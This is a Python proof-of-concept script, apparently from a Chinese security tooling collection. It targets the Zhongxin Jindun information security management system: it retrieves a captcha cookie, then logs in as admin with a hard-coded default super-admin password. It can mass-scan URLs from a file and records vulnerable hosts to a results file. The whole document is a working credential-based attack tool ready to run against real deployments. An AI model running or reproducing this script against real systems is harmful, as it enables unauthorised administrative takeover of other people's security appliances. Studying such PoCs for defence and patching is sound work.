import requests
import sys
import random
import argparse
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print("""
                            中新金盾信息安全管理系统默认超级管理员密码漏洞
                      use: python3  中新金盾信息安全管理系统默认超级管理员密码漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file
        print(self.url)

    def POC_1(self):
        vuln_url = self.url + "?q=common/getcode"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
            print("\033[36m[o] 正在获取验证码 {}?q=common/getcode ..... \033[0m".format(self.url))
            response_data = response.headers['Set-Cookie']
            check_code = re.findall(r'check_code=(.*?);', response_data)[0]
            PHPSESSID = re.findall(r'PHPSESSID=(.*?);', response_data)[0]
            print("\033[36m[o] 验证码:{}\n[o] PHPSESSID:{} \033[0m".format(check_code, PHPSESSID))
            vuln_url = self.url + "?q=common/login"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Cookie": "PHPSESSID={}; check_code={}".format(PHPSESSID, check_code),
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            }
            data = "name=admin&password=zxsoft1234!%40%23%24&checkcode={}&doLoginSubmit=1".format(check_code)
            try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
                if "1" in response.text and response.status_code == 200:
                    print("\033[36m[o] 目标 {} 存在默认管理员弱口令 admin / zxsoft1234!@#$ \033[0m".format(self.url))
                    with open("中新金盾信息安全管理系统 默认超级管理员密码漏洞结果.txt", mode="a") as rp:
                        rp.write(self.url  + "\n")
                else:
                    print("\033[31m[x] 目标 {} 不存在中新金盾信息安全管理系统默认管理员弱口令     \033[0m".format(self.url))
            except Exception as e:
                print("\033[31m[x] 请求失败 \033[0m", e)

        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                print(self.url)
                information.POC_1(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="中新金盾信息安全管理系统默认超级管理员密码漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 中新金盾信息安全管理系统默认超级管理员密码漏洞.py -u http://127.0.0.1\neg2:>>>python3 中新金盾信息安全管理系统默认超级管理员密码漏洞.py -f ip.txt")
    elif args.url:
        information(args).POC_1()
        print("来这里了吗")
    elif args.file:
        information(args).file_url()
